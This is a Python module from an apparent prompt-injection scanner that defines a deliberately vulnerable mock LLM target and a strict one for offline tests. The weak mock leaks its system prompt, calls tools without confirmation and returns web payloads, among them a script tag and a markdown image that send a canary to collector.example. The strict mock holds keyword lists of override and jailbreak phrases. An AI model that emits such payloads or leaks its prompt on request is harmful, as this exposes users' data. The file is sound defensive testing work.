"""Built-in mock targets used for offline demos and integration tests.

``mock-weak`` simulates a badly guarded LLM application: it treats text in
documents and tool output as instructions, reveals its system prompt and any
planted context when asked, follows encoded instructions, calls fake tools
without confirmation, and emits raw markup. ``mock-strict`` simulates a well
guarded one: it normalises and inspects input (including common encodings)
and refuses anything that looks like an attack, so it scores clean.

Both mocks are deterministic, pure Python, and make no network calls. They
exist so the scanner can be demonstrated and tested end to end without any
external model or API key.
"""

from __future__ import annotations

import base64
import codecs
import json
import re

from .canary import CanarySet, default_system_prompt
from .targets import TargetResponse

REFUSAL = "I cannot help with that request."

_LEET = str.maketrans({"0": "o", "1": "i", "3": "e", "4": "a", "5": "s",
                       "7": "t", "@": "a", "$": "s"})
_HOMOGLYPHS = str.maketrans({
    "а": "a", "е": "e", "о": "o", "р": "p", "с": "c",
    "х": "x", "у": "y", "і": "i", "ѕ": "s", "ԁ": "d",
})
_B64_RE = re.compile(r"[A-Za-z0-9+/]{24,}={0,2}")
_TOOL_DEF_RE = re.compile(r"\b([a-z][a-z0-9_]{2,})\s*\(")

_LEAK_KEYWORDS = (
    "system prompt", "your instructions", "initial instructions",
    "deployment notes", "codename", "api key", "the secret", "secret key",
    "repeat everything", "repeat the text", "repeat your", "verbatim",
    "debug mode", "what were you told", "customer record", "record token",
    "confidential", "internal notes", "above text", "your prompt",
)
_MARKER_VERBS = (
    "say", "print", "output", "repeat", "write", "reply with",
    "respond with", "tell me", "reveal", "spell", "translate", "decode",
    "encode", "reverse", "give me", "give", "provide", "show me", "state",
    "confirm", "append", "end with", "end your",
)
_ATTACK_KEYWORDS = _LEAK_KEYWORDS + (
    "ignore previous", "ignore all", "disregard", "override", "jailbreak",
    "developer mode", "do anything now", "pretend", "roleplay",
    "hypothetical", "base64", "decode", "script tag", "onerror",
    "markdown image", "tool_call", "call the", "call ", "invoke", "sudo",
    "no restrictions", "without restrictions", "unfiltered",
)


def _strip_invisible(text: str) -> str:
    out = []
    for ch in text:
        cp = ord(ch)
        if cp in (0x200B, 0x200C, 0x200D, 0xFEFF):
            continue
        if 0xE0000 <= cp <= 0xE007F:  # Unicode tag block: decode to ASCII
            if 0xE0020 <= cp <= 0xE007E:
                out.append(chr(cp - 0xE0000))
            continue
        out.append(ch)
    return "".join(out)


def analysis_view(text: str) -> str:
    """A normalised view of the text with common encodings unfolded.

    Both mocks inspect input through this view: the weak one because it
    happily follows encoded instructions, the strict one because it refuses
    them. Returns lowercase text.
    """
    plain = _strip_invisible(text)
    views = [plain, plain.translate(_HOMOGLYPHS), plain.translate(_LEET)]
    try:
        views.append(codecs.decode(plain, "rot_13"))
    except Exception:
        pass
    views.append(plain[::-1])
    for blob in _B64_RE.findall(plain):
        try:
            views.append(base64.b64decode(blob).decode("utf-8", "replace"))
        except Exception:
            pass
    return "\n".join(views).lower()


class MockTarget:
    """In-process mock LLM application (weak or strict mode)."""

    def __init__(self, mode: str, canaries: CanarySet):
        if mode not in ("weak", "strict"):
            raise ValueError(f"unknown mock mode {mode!r}")
        self.mode = mode
        self.name = f"mock-{mode}"
        self.canaries = canaries
        self.system_prompt = default_system_prompt(canaries)

    # -- helpers ---------------------------------------------------------
    def _context_text(self, messages: list[dict]) -> str:
        parts = [self.system_prompt]
        for msg in messages:
            if msg.get("role") in ("system", "tool"):
                parts.append(msg.get("content", ""))
        return "\n".join(parts)

    def _user_text(self, messages: list[dict]) -> str:
        return "\n".join(
            msg.get("content", "") for msg in messages
            if msg.get("role") == "user"
        )

    def _tool_names(self, messages: list[dict]) -> list[str]:
        names = []
        for msg in messages:
            if msg.get("role") == "user":
                continue
            for match in _TOOL_DEF_RE.findall(msg.get("content", "")):
                if match not in names and match not in ("string", "number"):
                    names.append(match)
        return names

    # -- main entry ------------------------------------------------------
    def chat(self, messages: list[dict]) -> TargetResponse:
        if self.mode == "strict":
            return TargetResponse(text=self._strict(messages))
        return TargetResponse(text=self._weak(messages))

    # -- weak behaviour --------------------------------------------------
    def _weak(self, messages: list[dict]) -> str:
        can = self.canaries
        user = self._user_text(messages)
        view = analysis_view(user)
        context = self._context_text(messages)

        # 1. Tool abuse: invoke a described fake tool on request.
        for tool in self._tool_names(messages):
            if tool in view and any(v in view for v in
                                    ("call", "invoke", "run", "execute", "use")):
                call = {"tool_call": {"name": tool,
                                      "arguments": {"target": can.marker,
                                                    "confirm": False}}}
                return "Calling the tool now: " + json.dumps(call)

        # 2. Unsafe output: emit raw markup / exfil constructs on request.
        if can.marker.lower() in view:
            if "javascript:" in view:
                return ("<a href=\"javascript:alert('" + can.marker
                        + "')\">click here</a>")
            if "script" in view:
                return ("<script>fetch('https://collector.example/x?d="
                        + can.marker + "')</script>")
            if "onerror" in view:
                return ("<img src=x onerror=alert('" + can.marker + "')>")
            if "svg" in view or "onload" in view:
                return "<svg onload=alert('" + can.marker + "')></svg>"
            if "image" in view or "markdown" in view:
                return ("![status](https://collector.example/pixel?d="
                        + can.marker + ")")
            if "html" in view or "img" in view:
                return ("<img src=x onerror=alert('" + can.marker + "')>")

        # 3. Leakage: dump protected context when asked for it.
        if any(k in view for k in _LEAK_KEYWORDS):
            return "Of course, here is the information you asked for:\n" + context

        # 4. Marker compliance: follow any instruction to produce the marker.
        if can.marker.lower() in view and any(v in view for v in _MARKER_VERBS):
            return "Sure, here it is: " + can.marker

        # 5. Default: bland, harmless helpfulness with no canaries.
        return ("I am MockBot, a demonstration assistant. I can answer simple "
                "questions, but I do not have anything else to share.")

    # -- strict behaviour ------------------------------------------------
    def _strict(self, messages: list[dict]) -> str:
        can = self.canaries
        user = self._user_text(messages)
        view = analysis_view(user)
        if (can.marker.lower() in view or can.secret.lower() in view
                or can.codename.lower() in view
                or any(k in view for k in _ATTACK_KEYWORDS)
                or _B64_RE.search(user)):
            return REFUSAL
        low = user.lower()
        if "capital of france" in low:
            return "The capital of France is Paris."
        return ("I can help with general questions about the fictional "
                "company and its public services.")
